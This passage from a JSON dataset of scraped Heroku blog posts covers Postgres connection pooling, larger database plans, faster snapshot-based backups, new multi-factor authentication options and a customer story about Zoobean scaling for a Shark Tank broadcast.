come. The MDA’s partners can also scale their learnings to achieve even greater impact. Thanks to the MDA experience, Xplenty can now offer DonorDrive and Tiltify pipeline templates to other charities interested in creating a single source of truth for their fundraising efforts. non-profit tableau xplenty", "date": "2021-01-21,"},
{"website": "Heroku", "title": " Connection Pooling for Heroku Postgres Is Now Generally Available", "author": ["Greg Nokes"], "link": "https://blog.heroku.com/connection-pooling", "abstract": "Connection Pooling for Heroku Postgres Is Now Generally Available Posted by Greg Nokes January 20, 2021 Listen to this article We are excited to announce that we are moving Connection Pooling for Heroku Postgres into GA.  Connection Pooling unlocks the ability to use up to 10,000 client connections to a Heroku Postgres Database, without adversely impacting performance on the database. This will unlock more complex and higher scale applications with simpler architectures on the Heroku Platform. Over the years, one of the factors that you have to consider when scaling applications is pressure on the database. Each connection to the database consumes resources that could be spent on processing requests. The balancing of resources spent on connections and processing is a delicate one that Heroku Engineering has had years of experience with. However, applications keep growing in complexity, with patterns like microservices and pure scale pushing the limits. Getting Started Connection Pooling is a managed version of PgBouncer on the database server, which maintains its own connection pool. PgBouncer directs queries to already open database connections, reducing the frequency with which new processes are created on your database server. It’s as easy as heroku pg:connection-pooling:attach to set up Connection Pooling for Heroku Postgres. See the documentation for more detail.\n​\n​ Feedback Welcome ​\nConnection Pooling opens new abilities to leverage Heroku Postgres at scale, and in more complex architectures. pgbouncer Enterprise connection pooling postgres", "date": "2021-01-20,"},
{"website": "Heroku", "title": "Announcing Larger Heroku Postgres Plans: More Power, More Storage", "author": ["Greg Nokes"], "link": "https://blog.heroku.com/larger-postgres-plans", "abstract": "Announcing Larger Heroku Postgres Plans: More Power, More Storage Posted by Greg Nokes January 21, 2021 Listen to this article As applications become more complex, so do the data requirements to support them. At Heroku we have been working hard on enabling these workloads, while maintaining the same level of abstraction, developer experience, and compliance you’ve come to expect. Today, we’re excited to announce new, larger Heroku Postgres Plans . These new plans will allow for applications on the Heroku Platform to expand in data size and complexity. The new plans in the Heroku Postgres offering have generous resource allocations, providing the horsepower to power today’s most demanding workloads. These plans come with 768 GB of RAM, 96 Cores and up to 4TB of storage , and are available on the Common Runtime, Private Spaces, and Heroku Shield, starting at $5800 per month. New Larger Plans These new larger plans introduce larger database sizes with more generous resource allocations, further expanding our existing plan line up to help your applications and data scale more smoothly. This new level 9 plan is available for Production-ready Postgres with our Standard tier, critical applications with our Premium tier, as well as with our Private Spaces-compatible Private and Shield tiers. Plan levels * RAM Provisioned I/O per second Disk size 0 4 GB 200 68 GB 2 8 GB 200 256 GB 3 15 GB 1000 512 GB 4 30 GB 2000 768 GB 5 61 GB 4000 1 TB 6 122 GB 6000 1.5 TB 7 244 GB 9000 2 TB 8 488 GB 12000 3 TB 9 768 GB 16000 4 TB * Applies to Standard, Premium, Private, Shield tiers You can learn more about the technical specifications of each plan - and what would best suit your needs - on our list of Heroku Postgres plans and our Dev Center article on choosing the right Heroku Postgres plan. More Power, More Storage Talking to customers, we have heard a need to access very large and complex datasets in Postgres. Whether it is enabling data visibility across many Salesforce orgs, using Postgres as an operational data store, or powering analytically-focused workloads for large-scale querying, the new Postgres plans will allow applications on Heroku to easily scale further. Getting Started If you have an existing Heroku Postgres database that is on a level 6,7, or 8 plan, there are a few simple options to upgrade to a level 9 plan; please see our Changing the Plan or Infrastructure of a Heroku Postgres Database Dev Center article for how to do this. If you are provisioning a new database with a level 9 plan, it’s as simple as $ heroku addons:create heroku-postgresql:standard-9 Starting today, these plans are available directly from the Elements Marketplace.", "date": "2021-01-21,"},
{"website": "Heroku", "title": "Announcing Heroku Postgres Enhancements: 40x Faster Backups ", "author": ["Greg Nokes", "Ayori Selassie"], "link": "https://blog.heroku.com/faster-postgres-backups", "abstract": "Announcing Heroku Postgres Enhancements: 40x Faster Backups Posted by Greg Nokes and Ayori Selassie January 27, 2021 Listen to this article Today, we’re thrilled to announce backups of Heroku Postgres are now 40x faster by leveraging Snapshots in place of base backups. We’ve been hard at work focused on improving performance, speed, and capacity for the Heroku Data services you rely on. In the past forks and follows of a Premium-8 test database with 992 GB of data took 22 hours; now with Snapshots, the same process is reduced to 10 minutes. This makes the creation of forks and followers, and restoring the database, faster than ever, at no additional charge. The New Way: Snapshots for Heroku Data In November 2020 we introduced a performance improvement to our physical backup and restore functionality for our Heroku Postgres customers. We now take snapshots in place of base backups. When we restore, we restore instances using the last snapshot taken. WAL replay from that point is still as before (using WAL-E). Forks and followers creation that used take sometimes up to 24 hours, now can take under 30 minutes The gap in HA availability during failovers or follower promotion that used to take anywhere up to 12 hours now takes under 15 minutes Snapshots are faster than base backups, occur at the storage level, and are incremental so we can take them more frequently. Overall, this means restoring a database is much faster now. Now with Snapshots, the rate at which we capture is dynamic. For average or low change databases we try to capture at least every 24 hours. For databases that change more frequently, however, we capture more frequently.  Restoring to a snapshot that is closest to the transaction we want to restore to means less WAL replay, and a lower mean-time-to-restore. The Old Way: Backups Was Not Built for Speed In the past backups of Heroku Postgres relied on a WAL-E for primary backup and restoration. WAL-E is a convenience wrapper for the two conceptual parts required for disaster recovery in a PostgreSQL world: Base backups are required when a database is first created. This is a copy of the full existing state of the database at the time it was taken. WAL records are changes to the database that can be archived elsewhere, using WAL records. These are smaller pieces of data that reflect changes to a database on a low level. To replay or restore a PostgreSQL service, we used to restore from a base backup first, then replay the WAL previously archived until the closest possible restore point is achieved. The combined processes of base backups and WAL record changes means it can take a long time to upload when new backups are made, and a long time to restore, which includes downloading the base backup from servers and replaying WAL record changes between base backups. You can read more about this backup and restore methodology in our Dev Center article on Heroku Postgres Data Safety and Continuous Protection . But clearly, this process was not built for speed, so we made it better! Feedback Welcome Snapshots are one of many improvements we’re making to improve your experience with Heroku Data Services. We’d love to hear from you on how this enhancement improves your workflow.", "date": "2021-01-27,"},
{"website": "Heroku", "title": "Enhancing Security - MFA with More Options, Now Available for All Heroku Customers", "author": ["Tushar Pradhan"], "link": "https://blog.heroku.com/heroku-mfa-options", "abstract": "Enhancing Security - MFA with More Options, Now Available for All Heroku Customers Posted by Tushar Pradhan April 12, 2021 Listen to this article Customer Trust is our highest priority at Salesforce and Heroku. It’s more important than ever to implement stronger security measures in light of increasing security threats that could affect services and apps that are critical to businesses and communities. We’re pleased to announce that all Heroku customers can now take advantage of the security offered by Multi-Factor Authentication (MFA) . We encourage you to check out these new MFA features and add another layer of protection to your account by enabling MFA. As we announced in February 2021, all Salesforce customers are required to enable MFA starting Feb 1, 2022 . There’s no reason to wait - it takes a couple of simple steps to enable MFA when prompted on your next login or from your Account Settings. Heroku MFA - More Options, Better Security You may be already familiar with Heroku 2FA using TOTP based code generator apps. Like 2FA, MFA requires an additional verification method after you enter your password. To meet your needs, we support several types of strong verification methods . You can take advantage of push notifications and automatic verification from trusted locations for fast, frictionless MFA using Salesforce Authenticator as a verification method. You can also use WebAuthn security keys and on-device biometrics as verification methods. TOTP based code generator apps are also available. You don’t even need to limit yourself to just one type of verification method - use recovery codes or additional verification methods to always have a backup. We are no longer offering SMS as a verification method for MFA due to Security risks associated with the use of SMS . If you had enabled Heroku 2FA in the past using a code generator app, you don’t need to take any further action to enable MFA. Your code generator app and any recovery codes will continue to work as MFA verification methods. Previously configured 2FA backup phone numbers will be usable for a limited time . Check out Dev Center for additional details about MFA. More Frequent Re-authentication As part of our ongoing security improvements, we are changing how long users can stay logged in on the Heroku Dashboard. Starting in April 2021, all users that are not using SSO will be required to log in every 12 hours. \nAs always, SSO enabled users need to log in through their identity provider every 8 hours. Coming Soon Keep an eye on this space for more news in the coming months as we make it easier to use MFA for your teams and continue to make other improvements. As always, we’d love to hear from you. 2FA security Salesforce MFA MFA", "date": "2021-04-12,"},
{"website": "Heroku", "title": "How a Shark Tank Pitch Led Zoobean’s Founders in an Unexpected Direction", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/zoobean-shark-tank-pitch", "abstract": "How a Shark Tank Pitch Led Zoobean’s Founders in an Unexpected Direction Posted by Sally Vedros April 14, 2021 Listen to this article Every entrepreneur wonders: “Will my startup sink or swim?” When Felix Brandon and his wife Jordan Lloyd Bookey launched Zoobean , a startup focused on children’s reading, they found themselves swimming in rough waters early on. A few months after launch, the founders were invited to pitch their business on the TV show Shark Tank. What felt like a sinking moment turned into more than a lifeline for the fledgling business — it entirely transformed their business model. In the year that followed the Shark Tank episode, Zoobean went from a consumer subscription service to an enterprise reading program platform loved by millions of readers of all ages. From the mouths of babes to the scrutiny of sharks Zoobean began in the simplest way: with a child’s comment. Felix and Jordan were looking for children’s books that could help their two-year-old son learn how to be a big brother, and they came across a book that featured an interracial, interfaith family like their own. For the first time, their son immediately recognized his own family in the pictures: “That’s mommy. That’s daddy. That’s me.” Felix recalls that pivotal moment: “We felt that everyone should have this experience of seeing themselves in a book. The problem was finding those books.” Felix and Jordan set about solving that problem, and in 2013, Zoobean was born. The company’s mission was to help people discover books that were right for their family. To jumpstart the business, the couple participated in a weekend competition run by NewME , an entrepreneurship program for founders who were people of color and/or women. Zoobean won the competition and NewME featured the startup across its social channels. What happened next was an entrepreneur’s dream come true. Felix and Jordan received a random email from a producer with Shark Tank — a show that could introduce their new service to the nation. Felix had been a long-time fan of the show from its early days, and he couldn’t believe his luck. “It was surreal,” he says. “The email came from a gmail address, so we didn’t believe it at first. We looked him up on IMDb before calling him.” Two months later, the couple were on the Shark Tank set in Hollywood. The drama of the Shark Tank pitch When Felix and Jordan arrived on set, it looked and felt like the familiar show — that is, until taping started. It was chaotic: everyone talked at once, the sharks made snide comments, and the entrepreneurs were struggling to hold their own. It was nothing like the edited version that appears on TV. “At one point, though,” says Felix, “it just felt like any conversation where you’re trying to pitch your business. But it was almost better, because we knew it would end with a “yes” or “no” rather than be left in limbo.” However, their answer did not come easily. The founders received heavy critique for the modest size of Zoobean’s customer base at the time, and the company’s business category also lacked definition, which sparked heated debate between the sharks. Although Zoobean’s focus was on sending books to monthly subscribers, Mark Cuban insisted that it was actually a technology company. Kevin O’Leary argued that Zoobean was a marketing company that “sent people things in a box.” In the end, Mark Cuban would be proven right. The Shark Tank experience was tough on Felix and Jordan, but they walked away with two invaluable wins. One was a “yes” from Mark Cuban, who invested $250k in the startup. “It was actually a benefit that we were so early in our business,” says Felix. “Mark seemed to understand and appreciate where we were with it.” The second was their new investor’s insight — maybe Zoobean really was a tech company? Felix and Jordan began to think more about their software’s potential and less about growing subscriptions. Getting ready for scale at prime time Once Mark Cuban decided to invest in Zoobean, Felix and Jordan teamed up with Tyler Ewing to lead technical development. The initial site had been built on Heroku by an agency, and when Tyler took the reins, he started by focusing on scalability. The Zoobean team didn’t know exactly when their episode would be aired, and they wanted to be ready for a surge in traffic to the site at showtime. Zoobean’s Heroku technical account manager walked Tyler through the process of monitoring performance and scaling dynos on Heroku, as well as load testing and making any modifications needed. They were storing data in Heroku Postgres and background jobs in the Heroku Add-on Redis to Go , using Sidekiq to process background jobs asynchronously. Caching data using the MemCachier add-on also helped enable scale. Another startup had experienced a crash during their Shark Tank episode, and the team was determined to avoid that scenario at all costs. Tyler load tested four times more traffic than expected — close to 200,000 requests per minute — and the site handled it well. Zoobean was ready. Monitoring web traffic during the show On April 18, 2014, six weeks after taping, the Zoobean episode aired. Sure enough, the expected traffic spike happened right when Felix and Jordan came on set and in the 15 minutes that followed. Throughout the show, Tyler kept a close eye on the Heroku Dashboard, as well as performance metrics coming in from Heroku Add-ons New Relic APM and Librato . “I think anytime you see that amount of traffic hit your site all of a sudden,” Tyler says, “it's always going to be scary.” To help allay his fears, their Heroku technical account manager had set up a channel on HipChat so that he could be available to help Tyler troubleshoot if needed. This allowed the whole team to relax a bit knowing that they wouldn’t have to scramble to try and get support in the moment. After the show aired on the East Coast, there was a second spike later that evening from West Coast viewers. Much to the team’s relief, the site held steady throughout with no issues, even as close to 25,000 concurrent users were eagerly exploring Zoobean as they watched Felix and Jordan pitch the business on TV. Feedback leads to business transformation For many startups, an appearance on Shark Tank results in millions of dollars in sales. For Zoobean, it was the opposite. The show sparked a tremendous amount of interest in the company, but sales were disappointing — yet another indicator that the business model needed a course correction. Undaunted, the founders responded quickly, which ultimately saved them time, energy, and resources. Felix says: “Our Shark Tank experience allowed us to see what wasn’t working. It would have otherwise taken us months, or maybe more, to figure that out.” By the time the show aired, the startup had already begun to pivot. Zoobean was still focused on consumers, but it now included a personalized book recommendation system, which put more focus on the technology and app experience than on shipping books. Soon, Zoobean was getting attention from libraries across the country, which opened entirely new opportunities for the business. The team worked with the Sacramento Public Library to develop a version of the app that allowed the library to recommend books in its collection to members. As more and more libraries followed suit, new ideas emerged, and Zoobean evolved even further. The team saw an unexpected spike in use from one library and discovered that it was using the app to run a summer reading program. They began promptly adding new features, such as tracking and incentives, that enabled libraries to engage readers in reading challenges. The result was their flagship product Beanstack , a customizable reading challenge platform for libraries, schools, colleges and universities, and corporations. “That’s really where the business has grown,” says Felix. “Recommendations are still important, but we’re now more focused on motivating groups if readers of all ages to read more.” Today, Zoobean is home to millions of readers Seven years after Shark Tank, Zoobean is a thriving company that serves over 1,900 library systems (representing 10,000 library branches), 1,200 schools, and three million readers. It’s business model is now primarily enterprise-focused, but the company’s core mission remains the same: helping kids become lifelong readers. This continually inspires new, innovative ideas to make an impact, such as extending the challenge model to support reading fundraisers, where students can raise money for their school by reading. In another new direction, companies are using Beanstack to run team-building programs based on shared reading experiences. Zoobean is also looking towards expanding Beanstack internationally and recently launched in Canada. To support Canadian data residency requirements, the team worked with Heroku to connect an AWS database in Canada to their Heroku Private Space using PrivateLink. “We're just really comfortable with Heroku,” says Tyler. “We didn't want to have to find another solution from a company in Canada or someone else. We wanted to try to keep as much consistent as possible, and Private Spaces offered us the way to do it.” As Felix and Jordan look back on their journey, one thing is clear. The Shark Tank experience was the springboard to Zoobean’s success, and they are “eternally grateful to be a part of the Shark Tank family.” shark tank scaling addons postgres Startup education", "date": "2021-04-14,"}
]